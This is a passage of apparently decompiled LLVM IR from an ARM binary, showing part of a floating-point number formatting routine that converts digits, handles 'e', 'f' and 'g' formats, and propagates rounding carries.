  %v6_18374 = fcmp ogt double %arg2, 0.000000e+00
  %v7_18374 = fcmp oeq double %arg2, 0.000000e+00
  %v8_18374 = select i1 %v6_18374, i32 1, i32 -1
  %v9_18374 = select i1 %v7_18374, i32 0, i32 %v8_18374
  store i32 %v9_18374, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18378 = icmp slt i32 %v9_18374, 0
  store i1 %v1_18378, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18374, label %dec_label_pc_18380, label %bb227

dec_label_pc_18380:                               ; preds = %dec_label_pc_18364
  %v10_18390 = fdiv double 0x3FF000003FD00000, %arg2
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_1839c = fcmp ogt double %v10_18390, 0.000000e+00
  %v7_1839c = zext i1 %v6_1839c to i32
  store i32 %v7_1839c, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_183a0 = icmp eq i1 %v6_1839c, false
  store i1 %v2_183a0, i1* %cpsr_z.global-to-local, align 1
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18588

bb227:                                            ; preds = %dec_label_pc_18364
  %v10_183f8 = fmul double %arg2, 0x3FD0000000022F78
  %v11_183f8 = fptrunc double %v10_183f8 to float
  %v12_183f8 = bitcast float %v11_183f8 to i32
  store i32 %v12_183f8, i32* %r2.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v6_1840c = fcmp olt double %v10_183f8, %arg2
  %v7_1840c = fcmp oeq double %v10_183f8, %arg2
  %v8_1840c = select i1 %v6_1840c, i32 1, i32 -1
  %v9_1840c = select i1 %v7_1840c, i32 0, i32 %v8_1840c
  store i32 %v9_1840c, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18410 = icmp slt i32 %v9_1840c, 0
  store i1 %v1_18410, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1840c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1840c, label %dec_label_pc_18418, label %dec_label_pc_1845c

dec_label_pc_18418:                               ; preds = %bb226, %bb227
  %v0_18348.v1_1835c8 = phi i32 [ 0, %bb227 ], [ 8, %bb226 ]
  store i32 %arg4, i32* %ip.global-to-local, align 4
  %v2_18420 = add i32 %arg4, 16
  %v3_18420 = inttoptr i32 %v2_18420 to i32*
  store i32 32, i32* %v3_18420, align 4
  %v0_18428 = load i32, i32* %sl.global-to-local, align 4
  %v1_18428 = add i32 %v0_18428, -96
  %v3_18428 = sub i32 95, %v0_18428
  %v4_18428 = and i32 %v3_18428, %v0_18428
  %v5_18428 = icmp slt i32 %v4_18428, 0
  store i1 %v5_18428, i1* %cpsr_v.global-to-local, align 1
  %v6_18428 = icmp slt i32 %v1_18428, 0
  store i1 %v6_18428, i1* %cpsr_n.global-to-local, align 1
  %v7_18428 = icmp eq i32 %v0_18428, 96
  store i1 %v7_18428, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-160, align 4
  %tmp286 = icmp ult i32 %v0_18428, 97
  br i1 %tmp286, label %bb228, label %.thread127

bb228:                                            ; preds = %dec_label_pc_18418
  %v5_1843c = or i32 %v0_18348.v1_1835c8, 4
  store i32 %v5_1843c, i32* %r3.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_18418, %bb228
  %v4_18440 = phi i32 [ %v5_1843c, %bb228 ], [ 3, %dec_label_pc_18418 ]
  %v4_18440.v0_18348.v1_1835c = select i1 %tmp286, i32 %v4_18440, i32 %v0_18348.v1_1835c8
  store i32 ptrtoint ([4 x i8]* @global_var_22f78.1548 to i32), i32* %r2.global-to-local, align 4
  %v2_1844c = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_1844c, i32* %r6.global-to-local, align 4
  %v2_18450 = add i32 %v4_18440.v0_18348.v1_1835c, ptrtoint ([4 x i8]* @global_var_22f78.1548 to i32)
  store i32 %v2_18450, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18994

dec_label_pc_1845c:                               ; preds = %bb227
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  store i32 %tmp183, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1852c

dec_label_pc_1852c:                               ; preds = %dec_label_pc_1852c, %dec_label_pc_1845c
  %v0_18534 = phi i32 [ 256, %dec_label_pc_1845c ], [ %v3_18534, %dec_label_pc_1852c ]
  %v0_184f0 = phi i32 [ %tmp183, %dec_label_pc_1845c ], [ %v11_184f8, %dec_label_pc_1852c ]
  %stack_var_-192.2 = phi i32 [ 8, %dec_label_pc_1845c ], [ %v2_1851c, %dec_label_pc_1852c ]
  %stack_var_-180.0 = phi i32 [ 9, %dec_label_pc_1845c ], [ %v1_18490, %dec_label_pc_1852c ]
  %v1_18490 = add nsw i32 %stack_var_-180.0, -1
  store i32 ptrtoint (i32* @global_var_22f8c.1551 to i32), i32* %r2.global-to-local, align 4
  %v3_184a4 = mul i32 %v1_18490, 8
  store i32 %v3_184a4, i32* %r3.global-to-local, align 4
  store i32 %v0_184f0, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v2_184b0 = add i32 %v3_184a4, ptrtoint (i32* @global_var_22f8c.1551 to i32)
  store i32 %v2_184b0, i32* %ip.global-to-local, align 4
  %v1_184b8 = inttoptr i32 %v2_184b0 to i32*
  %v2_184b8 = load i32, i32* %v1_184b8, align 4
  %v3_184b8 = sext i32 %v2_184b8 to i64
  %v1_184f0 = sext i32 %v0_184f0 to i64
  %v2_184f0 = bitcast i64 %v1_184f0 to double
  %v8_184f8 = bitcast i64 %v3_184b8 to double
  %v9_184f8 = fdiv double %v2_184f0, %v8_184f8
  %v10_184f8 = fptrunc double %v9_184f8 to float
  %v11_184f8 = bitcast float %v10_184f8 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v11_184f8, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  %v6_1850c = fcmp ogt double %v9_184f8, 0x4CBEBC20
  %v7_1850c = zext i1 %v6_1850c to i32
  store i32 %v7_1850c, i32* %r0.global-to-local, align 4
  %v2_1851c = add i32 %stack_var_-192.2, %v0_18534
  store i32 %v2_1851c, i32* %r1.global-to-local, align 4
  store i32 %v11_184f8, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %v1_18490, i32* %r2.global-to-local, align 4
  %v2_18530 = icmp eq i32 %v1_18490, 0
  %v3_18534 = sdiv i32 %v0_18534, 2
  br i1 %v2_18530, label %dec_label_pc_1853c, label %dec_label_pc_1852c

dec_label_pc_1853c:                               ; preds = %dec_label_pc_1852c
  %v6_1854c = fcmp ogt double %v9_184f8, 0x4E6E6B2A
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18550 = icmp eq i1 %v6_1854c, false
  store i1 %v2_18550, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 1092616194, i32* %r2.global-to-local, align 4
  %v10_18570 = fdiv double %v9_184f8, 0x4024000041F00000
  %v11_18570 = fptrunc double %v10_18570 to float
  %v12_18570 = bitcast float %v11_18570 to i32
  store i32 %v12_18570, i32* %r0.global-to-local, align 4
  store i32 520, i32* %r3.global-to-local, align 4
  store i32 %v12_18570, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18588

dec_label_pc_18588:                               ; preds = %dec_label_pc_18380, %dec_label_pc_1853c
  %v0_1859473 = phi i32 [ %tmp183, %dec_label_pc_18380 ], [ %v12_18570, %dec_label_pc_1853c ]
  %stack_var_-192.6 = phi i32 [ -1, %dec_label_pc_18380 ], [ 520, %dec_label_pc_1853c ]
  %v2_18588 = ptrtoint i32* %stack_var_-77 to i32
  store i32 %v2_18588, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18590

dec_label_pc_18590:                               ; preds = %dec_label_pc_18624.dec_label_pc_18590_crit_edge, %dec_label_pc_18588
  %v0_185c8 = phi i32 [ %v0_18594.pre, %dec_label_pc_18624.dec_label_pc_18590_crit_edge ], [ %v0_1859473, %dec_label_pc_18588 ]
  %v0_185cc = phi i32 [ %v0_18590.pre, %dec_label_pc_18624.dec_label_pc_18590_crit_edge ], [ %arg3, %dec_label_pc_18588 ]
  store i32 %v0_185cc, i32* %r1.global-to-local, align 4
  %v1_18598 = sext i32 %v0_185c8 to i64
  %v2_18598 = bitcast i64 %v1_18598 to double
  %v3_18598 = fptoui double %v2_18598 to i32
  store i32 %v3_18598, i32* %r4.global-to-local, align 4
  store i32 %v3_18598, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_185a4 = icmp slt i32 %v3_18598, 0
  store i1 %v1_185a4, i1* %cpsr_n.global-to-local, align 1
  %v2_185a4 = icmp eq i32 %v3_18598, 0
  store i1 %v2_185a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_185cc, i32* %r3.global-to-local, align 4
  br i1 %v1_185a4, label %dec_label_pc_185b4, label %dec_label_pc_185c8

dec_label_pc_185b4:                               ; preds = %dec_label_pc_18590
  store i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F0000000022F7B) to float) to i32), i32* %r0.global-to-local, align 4
  store i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F0000000022F7B) to float) to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_185cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_185c8

dec_label_pc_185c8:                               ; preds = %dec_label_pc_18590, %dec_label_pc_185b4
  store i32 %v0_185c8, i32* @r0, align 4
  store i32 %v0_185cc, i32* %r1.global-to-local, align 4
  %v1_185d0 = fptrunc double %v2_18598 to float
  %v2_185d0 = bitcast float %v1_185d0 to i32
  %v4_185d0 = call i32 @__aeabi_dsub(i32 %v2_185d0, i32 %v0_185cc)
  %v5_185d0 = sext i32 %v4_185d0 to i64
  store i32 1315859242, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_185dc = bitcast i64 %v5_185d0 to double
  %v9_185dc = fmul double %v3_185dc, 0x41CDCD6540240000
  %v10_185dc = fptrunc double %v9_185dc to float
  %v11_185dc = bitcast float %v10_185dc to i32
  store i32 %v11_185dc, i32* %r0.global-to-local, align 4
  %v0_185e0 = load i32, i32* %sb.global-to-local, align 4
  %v1_185e0 = add i32 %v0_185e0, 9
  store i32 %v1_185e0, i32* %sb.global-to-local, align 4
  store i32 %v11_185dc, i32* %r6.global-to-local, align 4
  store i32 %v0_185cc, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_185f0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_185f0

dec_label_pc_185f0:                               ; preds = %dec_label_pc_185f0.dec_label_pc_185f0_crit_edge, %dec_label_pc_185c8
  %v1_18604 = phi i32 [ %v1_18604.pre, %dec_label_pc_185f0.dec_label_pc_185f0_crit_edge ], [ %v1_185e0, %dec_label_pc_185c8 ]
  %v0_185fc = phi i32 [ %v0_18618, %dec_label_pc_185f0.dec_label_pc_185f0_crit_edge ], [ 0, %dec_label_pc_185c8 ]
  %v0_18608 = phi i32 [ %v2_18614, %dec_label_pc_185f0.dec_label_pc_185f0_crit_edge ], [ %v0_185f0.pre, %dec_label_pc_185c8 ]
  %v2_185f8 = urem i32 %v0_18608, 10
  %v1_185fc = add i32 %v0_185fc, 1
  store i32 %v1_185fc, i32* %r5.global-to-local, align 4
  %v1_18600 = or i32 %v2_185f8, 48
  store i32 %v1_18600, i32* %r2.global-to-local, align 4
  %v2_18604 = sub i32 %v1_18604, %v1_185fc
  store i32 %v2_18604, i32* %r3.global-to-local, align 4
  store i32 %v0_18608, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_18610 = trunc i32 %v1_18600 to i8
  %v3_18610 = inttoptr i32 %v2_18604 to i8*
  store i8 %v1_18610, i8* %v3_18610, align 1
  %v0_18614 = load i32, i32* %r0.global-to-local, align 4
  %v1_18614 = load i32, i32* %r1.global-to-local, align 4
  %v2_18614 = udiv i32 %v0_18614, %v1_18614
  store i32 %v2_18614, i32* %r0.global-to-local, align 4
  %v0_18618 = load i32, i32* %r5.global-to-local, align 4
  %v1_18618 = add i32 %v0_18618, -8
  %v3_18618 = sub i32 7, %v0_18618
  %v4_18618 = and i32 %v3_18618, %v0_18618
  %v5_18618 = icmp slt i32 %v4_18618, 0
  store i1 %v5_18618, i1* %cpsr_v.global-to-local, align 1
  %v6_18618 = icmp slt i32 %v1_18618, 0
  store i1 %v6_18618, i1* %cpsr_n.global-to-local, align 1
  %v7_18618 = icmp eq i32 %v0_18618, 8
  store i1 %v7_18618, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_18614, i32* %r4.global-to-local, align 4
  %v7_18620 = icmp slt i32 %v0_18618, 9
  br i1 %v7_18620, label %dec_label_pc_185f0.dec_label_pc_185f0_crit_edge, label %dec_label_pc_18624

dec_label_pc_185f0.dec_label_pc_185f0_crit_edge:  ; preds = %dec_label_pc_185f0
  %v1_18604.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_185f0

dec_label_pc_18624:                               ; preds = %dec_label_pc_185f0
  %v0_18624 = load i32, i32* %r8.global-to-local, align 4
  %v1_18624 = add i32 %v0_18624, 1
  store i32 %v1_18624, i32* %r8.global-to-local, align 4
  %v3_18628 = sub i32 -1, %v0_18624
  %v4_18628 = and i32 %v1_18624, %v3_18628
  %v5_18628 = icmp slt i32 %v4_18628, 0
  store i1 %v5_18628, i1* %cpsr_v.global-to-local, align 1
  %v6_18628 = icmp slt i32 %v0_18624, 0
  store i1 %v6_18628, i1* %cpsr_n.global-to-local, align 1
  %v7_18628 = icmp eq i32 %v0_18624, 0
  store i1 %v7_18628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18628, label %dec_label_pc_18624.dec_label_pc_18590_crit_edge, label %dec_label_pc_18630

dec_label_pc_18624.dec_label_pc_18590_crit_edge:  ; preds = %dec_label_pc_18624
  %v0_18590.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_18594.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18590

dec_label_pc_18630:                               ; preds = %dec_label_pc_18624
  %v0_18630 = load i32, i32* %sl.global-to-local, align 4
  %v1_18630 = add i32 %v0_18630, -96
  %v3_18630 = sub i32 95, %v0_18630
  %v4_18630 = and i32 %v3_18630, %v0_18630
  %v5_18630 = icmp slt i32 %v4_18630, 0
  store i1 %v5_18630, i1* %cpsr_v.global-to-local, align 1
  %v6_18630 = icmp slt i32 %v1_18630, 0
  store i1 %v6_18630, i1* %cpsr_n.global-to-local, align 1
  %v7_18630 = icmp eq i32 %v0_18630, 96
  store i1 %v7_18630, i1* %cpsr_z.global-to-local, align 1
  %tmp287 = icmp ult i32 %v0_18630, 97
  store i32 %v1_18660, i32* %ip.global-to-local, align 4
  br i1 %tmp287, label %bb229, label %thread-pre-split

bb229:                                            ; preds = %dec_label_pc_18630
  %v5_18640 = add i32 %v0_18630, 32
  store i32 %v5_18640, i32* %r3.global-to-local, align 4
  %v5_18644 = urem i32 %v5_18640, 256
  store i32 %v5_18644, i32* %sl.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_18630, %bb229
  %v0_18668 = phi i32 [ %v5_18644, %bb229 ], [ %v0_18630, %dec_label_pc_18630 ]
  %stack_var_-58.0131138 = phi i32 [ 69, %bb229 ], [ 101, %dec_label_pc_18630 ]
  %v7_18648 = icmp eq i32 %v0_18668, 103
  %. = zext i1 %v7_18648 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18654 = icmp slt i32 %v1_18660, 0
  store i1 %v1_18654, i1* %cpsr_n.global-to-local, align 1
  %v2_18654 = icmp eq i32 %v1_18660, 0
  store i1 %v2_18654, i1* %cpsr_z.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_18660, 1
  br i1 %tmp232, label %.thread12, label %bb233

.thread12:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb235

bb233:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1865c = icmp eq i1 %v7_18648, false
  store i1 %v2_1865c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1865c, label %bb235, label %bb234

bb234:                                            ; preds = %bb233
  %v2_18660 = add i32 %v1_18660, -1
  store i32 %v2_18660, i32* %ip.global-to-local, align 4
  br label %bb235

bb235:                                            ; preds = %.thread12, %bb233, %bb234
  %v0_18664 = phi i32 [ %v1_18660, %.thread12 ], [ %v1_18660, %bb233 ], [ %v2_18660, %bb234 ]
  %v1_18668 = add i32 %v0_18668, -102
  %v3_18668 = sub i32 101, %v0_18668
  %v4_18668 = and i32 %v3_18668, %v0_18668
  %v5_18668 = icmp slt i32 %v4_18668, 0
  store i1 %v5_18668, i1* %cpsr_v.global-to-local, align 1
  %v6_18668 = icmp slt i32 %v1_18668, 0
  store i1 %v6_18668, i1* %cpsr_n.global-to-local, align 1
  %v7_18668 = icmp eq i32 %v0_18668, 102
  store i1 %v7_18668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18668, label %dec_label_pc_18674, label %bb236

bb236:                                            ; preds = %bb235
  store i32 %v0_18664, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_186a0

dec_label_pc_18674:                               ; preds = %bb235
  store i32 %v0_18664, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-192.6, i32* %r1.global-to-local, align 4
  %v2_1867c = add i32 %v0_18664, %stack_var_-192.6
  store i32 %v2_1867c, i32* %ip.global-to-local, align 4
  %v1_18680 = add i32 %v2_1867c, 1
  %v3_18680 = sub i32 0, %v2_1867c
  %v4_18680 = and i32 %v1_18680, %v3_18680
  %v5_18680 = icmp slt i32 %v4_18680, 0
  store i1 %v5_18680, i1* %cpsr_v.global-to-local, align 1
  %v6_18680 = icmp slt i32 %v1_18680, 0
  store i1 %v6_18680, i1* %cpsr_n.global-to-local, align 1
  %v7_18680 = icmp eq i32 %v1_18680, 0
  store i1 %v7_18680, i1* %cpsr_z.global-to-local, align 1
  %v2_18684 = xor i1 %v6_18680, %v5_18680
  br i1 %v2_18684, label %dec_label_pc_18688, label %dec_label_pc_186a0

dec_label_pc_18688:                               ; preds = %dec_label_pc_18674
  %v2_18688 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_18688, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_18694 = bitcast i32* %stack_var_-79 to i8*
  %v3_18694 = call i32 @__GI_memset(i8* %v2_18694, i32 48)
  store i32 %v3_18694, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_186a0

dec_label_pc_186a0:                               ; preds = %bb236, %dec_label_pc_18674, %dec_label_pc_18688
  %v1_186e488 = phi i32 [ %v3_18694, %dec_label_pc_18688 ], [ %v0_18664, %dec_label_pc_18674 ], [ %v2_18614, %bb236 ]
  %v1_186c8 = phi i32 [ -1, %dec_label_pc_18688 ], [ %v2_1867c, %dec_label_pc_18674 ], [ %v0_18664, %bb236 ]
  %stack_var_-192.7 = phi i32 [ -1, %dec_label_pc_18688 ], [ %stack_var_-192.6, %dec_label_pc_18674 ], [ %stack_var_-192.6, %bb236 ]
  %v1_186a4 = add i32 %v1_186c8, -16
  %v3_186a4 = sub i32 15, %v1_186c8
  %v4_186a4 = and i32 %v3_186a4, %v1_186c8
  %v5_186a4 = icmp slt i32 %v4_186a4, 0
  store i1 %v5_186a4, i1* %cpsr_v.global-to-local, align 1
  %v6_186a4 = icmp slt i32 %v1_186a4, 0
  store i1 %v6_186a4, i1* %cpsr_n.global-to-local, align 1
  %v7_186a4 = icmp eq i32 %v1_186c8, 16
  store i1 %v7_186a4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-78, align 4
  %v2_186b0 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_186b0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-79, align 4
  %v3_186b8 = xor i1 %v6_186a4, %v5_186a4
  %v4_186b8 = or i1 %v7_186a4, %v3_186b8
  br i1 %v4_186b8, label %dec_label_pc_186c4, label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %dec_label_pc_186a0
  store i32 0, i32* %r0.global-to-local, align 4
  %v7_186bc152 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v7_186bc152, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_186c4:                               ; preds = %dec_label_pc_186a0
  %v2_186c4 = ptrtoint i32* %stack_var_-78 to i32
  %v2_186c8 = add i32 %v1_186c8, %v2_186c4
  store i32 %v2_186c8, i32* %r3.global-to-local, align 4
  %v1_186cc = add i32 %v2_186c8, 2
  %v2_186cc = inttoptr i32 %v1_186cc to i8*
  %v3_186cc = load i8, i8* %v2_186cc, align 1
  %v4_186cc = zext i8 %v3_186cc to i32
  store i32 %v4_186cc, i32* %r2.global-to-local, align 4
  store i32 %v1_186cc, i32* %r1.global-to-local, align 4
  %v2_186d4 = icmp ugt i8 %v3_186cc, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_186d4 = icmp ult i8 %v3_186cc, 52
  store i1 %v6_186d4, i1* %cpsr_n.global-to-local, align 1
  %v7_186d4 = icmp eq i8 %v3_186cc, 52
  store i1 %v7_186d4, i1* %cpsr_z.global-to-local, align 1
  %v2_186d8 = xor i1 %v2_186d4, true
  %v3_186d8 = or i1 %v7_186d4, %v2_186d8
  br i1 %v3_186d8, label %bb237, label %bb238

bb237:                                            ; preds = %dec_label_pc_186c4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb238

bb238:                                            ; preds = %dec_label_pc_186c4, %bb237
  %v1_186e486 = phi i32 [ %v1_186e488, %dec_label_pc_186c4 ], [ 0, %bb237 ]
  %v2_186dc = xor i1 %v7_186d4, true
  %v3_186dc = and i1 %v2_186d4, %v2_186dc
  br i1 %v3_186dc, label %bb239, label %.preheader

bb239:                                            ; preds = %bb238
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb238, %bb239, %..preheader_crit_edge, %.backedge
  %v1_186e4 = phi i32 [ %v1_186e4.pre, %.backedge ], [ 0, %..preheader_crit_edge ], [ %v1_186e486, %bb238 ], [ 1, %bb239 ]
  %v0_186e0 = phi i32 [ %v0_186ec, %.backedge ], [ %v7_186bc152, %..preheader_crit_edge ], [ %v1_186cc, %bb238 ], [ %v1_186cc, %bb239 ]
  %v1_186e0 = add i32 %v0_186e0, -1
  %v2_186e0 = inttoptr i32 %v1_186e0 to i8*
  %v3_186e0 = load i8, i8* %v2_186e0, align 1
  %v4_186e0 = zext i8 %v3_186e0 to i32
  store i32 %v1_186e0, i32* %r1.global-to-local, align 4
  %v2_186e4 = add i32 %v4_186e0, %v1_186e4
  store i32 %v2_186e4, i32* %r3.global-to-local, align 4
  %v1_186e8 = trunc i32 %v2_186e4 to i8
  store i8 %v1_186e8, i8* %v2_186e0, align 1
  %v0_186ec = load i32, i32* %r1.global-to-local, align 4
  %v1_186ec = inttoptr i32 %v0_186ec to i8*
  %v2_186ec = load i8, i8* %v1_186ec, align 1
  %v3_186ec = zext i8 %v2_186ec to i32
  store i32 %v3_186ec, i32* %r2.global-to-local, align 4
  %v2_186f0 = icmp ugt i8 %v2_186ec, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_186f0 = icmp ult i8 %v2_186ec, 57
  store i1 %v6_186f0, i1* %cpsr_n.global-to-local, align 1
  %v7_186f0 = icmp eq i8 %v2_186ec, 57
  store i1 %v7_186f0, i1* %cpsr_z.global-to-local, align 1
  %v2_186f4 = xor i1 %v2_186f0, true
  %v3_186f4 = or i1 %v7_186f0, %v2_186f4
  br i1 %v3_186f4, label %bb240, label %bb241

bb240:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb241

bb241:                                            ; preds = %.preheader, %bb240
  %v2_186f8 = xor i1 %v7_186f0, true
  %v3_186f8 = and i1 %v2_186f0, %v2_186f8
  br i1 %v3_186f8, label %bb242, label %._crit_edge

._crit_edge:                                      ; preds = %bb241
  %v1_18700.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb243

bb242:                                            ; preds = %bb241
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb243

bb243:                                            ; preds = %._crit_edge, %bb242
  %v1_18700 = phi i32 [ %v1_18700.pre, %._crit_edge ], [ 1, %bb242 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_186fc = icmp ult i8 %v2_186ec, 48
  store i1 %v6_186fc, i1* %cpsr_n.global-to-local, align 1
  %v7_186fc = icmp eq i8 %v2_186ec, 48
  store i1 %v7_186fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_186fc, label %.thread17, label %bb244

.thread17:                                        ; preds = %bb243
  %v2_18700 = or i32 %v1_18700, 1
  store i32 %v2_18700, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1870418 = icmp slt i32 %v2_18700, 0
  store i1 %v1_1870418, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb244:                                            ; preds = %bb243
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18704 = icmp slt i32 %v1_18700, 0
  store i1 %v1_18704, i1* %cpsr_n.global-to-local, align 1
  %v2_18704 = icmp eq i32 %v1_18700, 0
  store i1 %v2_18704, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18704, label %dec_label_pc_1870c, label %.backedge

.backedge:                                        ; preds = %bb244, %.thread17
  %v1_186e4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_1870c:                               ; preds = %bb244
  store i32 %v2_186b0, i32* %r2.global-to-local, align 4
  %v2_18710 = ptrtoint i32* %stack_var_-78 to i32
  store i32 %v2_18710, i32* %r3.global-to-local, align 4
  %v2_18714 = sub i32 %v0_186ec, %v2_18710
  %v3_18714 = icmp uge i32 %v0_186ec, %v2_18710
  %v4_18714 = xor i32 %v0_186ec, %v2_18710
  %v5_18714 = xor i32 %v2_18714, %v0_186ec
  %v6_18714 = and i32 %v5_18714, %v4_18714
  %v7_18714 = icmp slt i32 %v6_18714, 0
  store i1 %v7_18714, i1* %cpsr_v.global-to-local, align 1
  %v8_18714 = icmp slt i32 %v2_18714, 0
  store i1 %v8_18714, i1* %cpsr_n.global-to-local, align 1
  %v9_18714 = icmp eq i32 %v0_186ec, %v2_18710
  store i1 %v9_18714, i1* %cpsr_z.global-to-local, align 1
  %v2_18718 = xor i1 %v3_18714, true
  %v3_18718 = or i1 %v9_18714, %v2_18718
  br i1 %v3_18718, label %bb245, label %.thread162

bb245:                                            ; preds = %dec_label_pc_1870c
  store i32 %v2_18710, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-192.7, i32* %r3.global-to-local, align 4
  store i32 %v2_18710, i32* %r1.global-to-local, align 4
  br label %.thread162

.thread162:                                       ; preds = %dec_label_pc_1870c, %bb245
  %v4_18728160 = phi i32 [ %stack_var_-192.7, %bb245 ], [ %v2_18710, %dec_label_pc_1870c ]
  %v2_18738 = phi i32 [ %v2_18710, %bb245 ], [ %v0_186ec, %dec_label_pc_1870c ]
  %v4_1872c154159 = phi i32 [ %v2_18710, %bb245 ], [ %v2_186b0, %dec_label_pc_1870c ]
  %v2_18724 = xor i1 %v9_18714, true
  %v3_18724 = and i1 %v3_18714, %v2_18724
  br i1 %v3_18724, label %bb246, label %bb247

bb246:                                            ; preds = %.thread162
  store i32 %stack_var_-192.7, i32* %r0.global-to-local, align 4
  br label %bb247

bb247:                                            ; preds = %.thread162, %bb246
  br i1 %v3_18718, label %bb248, label %bb249

bb248:                                            ; preds = %bb247
  %v5_18728 = add i32 %v4_18728160, 1
  store i32 %v5_18728, i32* %r0.global-to-local, align 4
  br label %bb249

bb249:                                            ; preds = %bb247, %bb248
  br i1 %v3_18724, label %bb250, label %bb251

bb250:                                            ; preds = %bb249
  %v5_1872c = add i32 %v4_1872c154159, 2
  store i32 %v5_1872c, i32* %r2.global-to-local, align 4
  br label %bb251

bb251:                                            ; preds = %bb249, %bb250
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18734 = load i32, i32* %sl.global-to-local, align 4
  %v1_18734 = add i32 %v0_18734, -103
  %v3_18734 = sub i32 102, %v0_18734
  %v4_18734 = and i32 %v3_18734, %v0_18734
  %v5_18734 = icmp slt i32 %v4_18734, 0
